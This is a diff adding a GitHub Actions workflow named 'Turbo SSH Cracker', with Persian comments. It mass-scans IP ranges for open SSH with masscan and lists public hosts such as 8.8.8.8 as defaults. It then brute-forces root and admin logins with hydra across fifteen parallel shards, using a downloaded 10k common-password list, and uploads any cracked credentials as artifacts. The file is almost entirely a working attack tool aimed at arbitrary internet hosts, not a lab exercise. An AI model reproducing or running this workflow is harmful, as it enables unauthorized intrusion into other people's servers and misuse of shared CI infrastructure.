@@ -1,0 +1,131 @@
+name: Turbo SSH Cracker - No Repeat
+
+on:
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: 'mode: manual / auto'
+        default: 'manual'
+      manual_range:
+        description: 'manual: IP range (CIDR)'
+        required: false
+      auto_type:
+        description: 'auto: random / list'
+        default: 'random'
+      usernames:
+        description: 'usernames (comma)'
+        default: 'root,admin'
+      threads_per_shard:
+        description: 'hydra threads per shard'
+        default: '128'
+      rate:
+        description: 'masscan rate (packets/sec)'
+        default: '5000'
+
+jobs:
+  discover-hosts:
+    runs-on: ubuntu-latest
+    outputs:
+      hosts_file: hosts.txt
+    steps:
+      - name: Install masscan
+        run: sudo apt update && sudo apt install -y masscan
+      - name: Scan for open SSH
+        run: |
+          if [ "${{ github.event.inputs.mode }}" = "manual" ]; then
+            sudo masscan ${{ github.event.inputs.manual_range }} -p22 --rate=${{ github.event.inputs.rate }} -oL scan.raw
+          else
+            # auto: تولید تصادفی یا از لیست (ساده شده)
+            echo "8.8.8.8:22" > scan.raw
+            echo "1.1.1.1:22" >> scan.raw
+          fi
+          grep -E "open" scan.raw | awk '{print $4":"$3}' > hosts.txt
+      - name: Upload hosts
+        uses: actions/upload-artifact@v4
+        with:
+          name: all-hosts
+          path: hosts.txt
+
+  attack:
+    needs: discover-hosts
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14]
+    steps:
+      - name: Install hydra & sshpass
+        run: sudo apt update && sudo apt install -y hydra sshpass
+
+      - name: Download hosts & dictionary
+        uses: actions/download-artifact@v4
+        with:
+          name: all-hosts
+          path: ./scan
+
+      - name: Prepare password dictionary (10k common)
+        run: |
+          curl -s -o pass.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt
+          # اگه failed باشه یه دیکشنری کوچک بساز
+          if [ ! -s pass.txt ]; then echo -e "123456\npassword\nadmin\nroot" > pass.txt; fi
+
+      - name: Shard hosts by hash (each host tested only by one shard)
+        id: shard
+        run: |
+          SHARD_ID=${{ matrix.shard }}
+          TOTAL_SHARDS=${{ strategy.job-total }}
+          MY_HOSTS="my_hosts_${SHARD_ID}.txt"
+          > $MY_HOSTS
+          while read line; do
+            ip=$(echo $line | cut -d: -f1)
+            # محاسبه hash ساده با awk
+            hash=$(echo $ip | awk -F. '{print ($1*16777619 + $2*16777619 + $3*16777619 + $4) % 65536}')
+            if [ $((hash % TOTAL_SHARDS)) -eq $SHARD_ID ]; then
+              echo $line >> $MY_HOSTS
+            fi
+          done < scan/hosts.txt
+          echo "hosts_count=$(cat $MY_HOSTS | wc -l)" >> $GITHUB_OUTPUT
+
+      - name: Attack my hosts without repeating password attempts
+        run: |
+          USERNAMES=$(echo '${{ github.event.inputs.usernames }}' | tr ',' '\n')
+          PASSWORDS="pass.txt"
+          SUCCESS_FILE="success_${{ matrix.shard }}.txt"
+          FAILED_FILE="failed_${{ matrix.shard }}.txt"
+          touch $SUCCESS_FILE $FAILED_FILE
+          
+          # استفاده از set برای جلوگیری از تکرار (فقط برای همین اجرا)
+          declare -A tested
+          while read hostline; do
+            ip=$(echo $hostline | cut -d: -f1)
+            port=$(echo $hostline | cut -d: -f2)
+            for user in $USERNAMES; do
+              while IFS= read -r pass; do
+                key="${ip}:${port}:${user}:${pass}"
+                if [[ -n "${tested[$key]}" ]]; then
+                  continue  # قبلاً تست شده
+                fi
+                tested[$key]=1
+                # تست با hydra روی یک هدف (با timeout کم)
+                timeout 5 hydra -l "$user" -p "$pass" -s "$port" -t 1 -o /dev/null "$ip" ssh 2>/dev/null | grep -q "host: $ip.*password:"
+                if [ $? -eq 0 ]; then
+                  echo "✅ $ip:$port|$user|$pass" | tee -a $SUCCESS_FILE
+                  # اگه پیدا شد، می‌تونی break کنی (اختیاری)
+                  break 3
+                else
+                  echo "$key" >> $FAILED_FILE
+                fi
+              done < $PASSWORDS
+            done
+          done < my_hosts_${{ matrix.shard }}.txt
+          
+          if [ -s $SUCCESS_FILE ]; then
+            echo "success=true" >> $GITHUB_OUTPUT
+          fi
+
+      - name: Upload success
+        if: steps.shard.outputs.hosts_count != '0'
+        uses: actions/upload-artifact@v4
+        with:
+          name: success-shard-${{ matrix.shard }}
+          path: success_${{ matrix.shard }}.txt
